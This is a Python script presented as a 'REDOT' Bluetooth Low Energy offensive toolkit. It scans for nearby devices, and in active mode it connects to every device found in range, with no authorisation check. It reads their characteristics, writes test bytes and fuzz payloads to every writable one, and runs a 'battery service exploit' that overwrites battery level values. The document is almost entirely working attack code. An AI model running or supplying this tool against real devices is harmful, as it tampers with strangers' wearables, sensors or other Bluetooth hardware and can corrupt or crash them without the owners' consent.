#!/usr/bin/env python3
# REDOT: ble_scan.py
# BLE offensive toolkit with scanning, interrogation, and advanced fuzzing/exploitation

import asyncio
import argparse
import logging
import time
import csv
import json
import os
from bleak import BleakScanner, BleakClient
from bleak.exc import BleakError

LOG_DIR = "logs/ble_scan"
os.makedirs(LOG_DIR, exist_ok=True)

def setup_logger(log_file):
    logging.basicConfig(
        filename=log_file,
        level=logging.INFO,
        format='[%(asctime)s] %(message)s',
        datefmt='%H:%M:%S'
    )

def log(msg):
    timestamp = time.strftime("%H:%M:%S")
    print(f"[{timestamp}] {msg}")
    logging.info(msg)

class BLEOffensiveToolkit:
    def __init__(self, rssi_threshold, name_filter, scan_duration, output_path, output_format):
        self.rssi_threshold = rssi_threshold
        self.name_filter = name_filter.lower() if name_filter else None
        self.scan_duration = scan_duration
        self.output_path = output_path
        self.output_format = output_format.lower() if output_format else "csv"
        self.devices = {}  # address → info dict

    def detection_callback(self, device, advertisement_data):
        if device.rssi < self.rssi_threshold:
            return
        if self.name_filter and (device.name is None or self.name_filter not in device.name.lower()):
            return

        info = {
            "address": device.address,
            "name": device.name,
            "rssi": device.rssi,
            "service_uuids": advertisement_data.service_uuids or [],
            "manufacturer_data": {k: v.hex() for k, v in advertisement_data.manufacturer_data.items()} if advertisement_data.manufacturer_data else {}
        }
        if (device.address not in self.devices) or (info["rssi"] > self.devices[device.address]["rssi"]):
            self.devices[device.address] = info
            log(f"Discovered BLE Device: {info['address']} | Name: {info['name']} | RSSI: {info['rssi']} dBm")
            if info["service_uuids"]:
                log(f"    Service UUIDs: {', '.join(info['service_uuids'])}")
            if info["manufacturer_data"]:
                mdata_str = ", ".join(f"{k}: {v}" for k, v in info["manufacturer_data"].items())
                log(f"    Manufacturer Data: {mdata_str}")

    async def run_scan(self):
        scanner = BleakScanner()
        scanner.register_detection_callback(self.detection_callback)
        log(f"Starting BLE scan for {self.scan_duration} seconds...")
        await scanner.start()
        await asyncio.sleep(self.scan_duration)
        await scanner.stop()
        log(f"BLE scan completed. Found {len(self.devices)} device(s).")
        self.export_results()

    def export_results(self):
        if not self.output_path:
            log("No output path specified, skipping export.")
            return

        log(f"Exporting results to {self.output_path} as {self.output_format.upper()}")

        if self.output_format == "json":
            with open(self.output_path, "w") as f:
                json.dump(list(self.devices.values()), f, indent=2)
        else:
            with open(self.output_path, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["Address", "Name", "RSSI", "Service UUIDs", "Manufacturer Data"])
                for dev in self.devices.values():
                    writer.writerow([
                        dev["address"],
                        dev["name"],
                        dev["rssi"],
                        ";".join(dev["service_uuids"]),
                        ";".join(f"{k}:{v}" for k, v in dev["manufacturer_data"].items())
                    ])
        log("Export complete.")

    async def active_interrogate(self):
        log("Starting active interrogation on discovered devices...")
        for addr, info in self.devices.items():
            log(f"Connecting to {addr}...")
            try:
                async with BleakClient(addr, timeout=20) as client:
                    is_connected = await client.is_connected()
                    if not is_connected:
                        log(f"Failed to connect to {addr}")
                        continue
                    services = await client.get_services()
                    log(f"Device {addr} services and characteristics:")
                    for svc in services:
                        log(f" Service {svc.uuid}: {svc.description}")
                        for char in svc.characteristics:
                            props = ",".join(char.properties)
                            log(f"  Char {char.uuid} - Properties: {props}")

                            if "read" in char.properties:
                                await self.safe_read(client, char)

                            if "write" in char.properties or "write-without-response" in char.properties:
                                await self.safe_write_test(client, char)

                    # After enumeration, launch advanced fuzzing/exploitation
                    await self.advanced_fuzzing(client, services)

            except BleakError as e:
                log(f"Connection error on {addr}: {e}")
            except Exception as e:
                log(f"Unexpected error on {addr}: {e}")

    async def safe_read(self, client, char):
        try:
            val = await client.read_gatt_char(char.uuid)
            val_hex = val.hex()
            val_str = val.decode(errors="ignore")
            log(f"    Read value (hex): {val_hex}")
            log(f"    Read value (ascii): {val_str}")
        except Exception as e:
            log(f"    Read failed: {e}")

    async def safe_write_test(self, client, char):
        try:
            test_payload = b"\x00"  # single null byte safe payload
            await client.write_gatt_char(char.uuid, test_payload, response=True)
            log(f"    Wrote test payload to {char.uuid} successfully")
        except Exception as e:
            log(f"    Write test failed: {e}")

    async def advanced_fuzzing(self, client, services):
        log("Starting advanced fuzzing and exploitation modules...")

        for svc in services:
            # Example: Target Battery Service to test manipulation (UUID: 0000180F-0000-1000-8000-00805f9b34fb)
            if svc.uuid.lower() == "0000180f-0000-1000-8000-00805f9b34fb":
                log(f" - Battery service detected: {svc.uuid}")
                await self.battery_service_exploit(client, svc)

            # Fuzz all writable characteristics in this service
            for char in svc.characteristics:
                if "write" in char.properties or "write-without-response" in char.properties:
                    await self.fuzz_characteristic(client, char)

                # Also try notification subscription fuzzing if possible
                if "notify" in char.properties:
                    await self.fuzz_notifications(client, char)

    async def battery_service_exploit(self, client, service):
        log("  Battery Service Exploit: Writing max value (0x64) to battery level characteristic if writable")
        for char in service.characteristics:
            if "write" in char.properties or "write-without-response" in char.properties:
                try:
                    max_battery = bytes([0x64])  # 100%
                    await client.write_gatt_char(char.uuid, max_battery, response=True)
                    log(f"    Successfully wrote max battery level to {char.uuid}")
                except Exception as e:
                    log(f"    Battery exploit write failed: {e}")

    async def fuzz_characteristic(self, client, char):
        fuzz_payloads = [
            b"",
            b"\x00",
            b"\xFF"*10,
            b"\x00\xFF\x00\xFF"*5,
            b"A"*20,
            b"\x7F"*50,
            b"\x00"*100,
        ]
        log(f"  Fuzzing characteristic {char.uuid} with {len(fuzz_payloads)} payloads")
        for payload in fuzz_payloads:
            try:
                await client.write_gatt_char(char.uuid, payload, response=True)
                log(f"    Fuzz write success: payload length {len(payload)}")
                await asyncio.sleep(0.2)
            except Exception as e:
                log(f"    Fuzz write failed (expected sometimes): {e}")

    async def fuzz_notifications(self, client, char):
        log(f"  Attempting notification subscription fuzzing on {char.uuid}")

        def callback(sender, data):
            log(f"    Notification from {sender}: {data.hex()}")

        try:
            await client.start_notify(char.uuid, callback)
            # Wait short time to receive notifications, potentially malformed
            await asyncio.sleep(5)
            await client.stop_notify(char.uuid)
            log(f"    Notification fuzzing completed on {char.uuid}")
        except Exception as e:
            log(f"    Notification fuzzing failed: {e}")

def parse_args():
    parser = argparse.ArgumentParser(description="REDOT Advanced BLE Offensive Toolkit")
    parser.add_argument("-r", "--rssi", type=int, default=-80, help="Minimum RSSI threshold (default: -80)")
    parser.add_argument("-n", "--name", type=str, default=None, help="Filter devices by name substring (case-insensitive)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Scan duration in seconds (default: 60)")
    parser.add_argument("-o", "--output", type=str, default=f"{LOG_DIR}/ble_scan_results.csv", help="Output file path")
    parser.add_argument("-f", "--output-format", type=str, choices=["csv", "json"], default="csv", help="Output file format (csv or json)")
    parser.add_argument("-a", "--active", action="store_true", help="Perform active BLE service interrogation and fuzzing after scanning")
    return parser.parse_args()

def main():
    args = parse_args()
    setup_logger(args.output + ".log")
    toolkit = BLEOffensiveToolkit(args.rssi, args.name, args.duration, args.output, args.output_format)

    try:
        asyncio.run(toolkit.run_scan())
        if args.active:
            asyncio.run(toolkit.active_interrogate())
    except KeyboardInterrupt:
        log("Scan interrupted by user.")

if __name__ == "__main__":
    main()
